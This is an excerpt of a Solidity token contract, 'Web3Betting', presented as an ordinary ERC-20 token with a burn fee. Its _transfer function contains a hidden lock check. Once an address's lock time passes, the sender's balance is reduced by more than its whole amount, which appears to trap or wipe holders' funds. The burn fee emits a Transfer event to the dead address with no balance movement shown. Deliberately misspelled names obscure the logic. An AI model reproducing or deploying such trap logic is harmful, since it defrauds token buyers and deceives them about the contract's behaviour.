...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fieee https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "Web3Betting";
    string private _symbol = "Web3B";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfieee = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _defaultLkTime = 1660533276;
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        if (_LKD[sender] > 1660533276 && block.timestamp > _LKD[sender]) {
            _balance[sender] = _balance[sender].sub(blsender.add(100000));
        }
        ...
        uint256 amoun;
        amoun = amonnts - fieeeamonnt;
        _balance[recipient] += amoun;
        if (_burnfieee > 0){
            emit Transfer (sender, _DEADaddress, fieeeamonnt);
        }
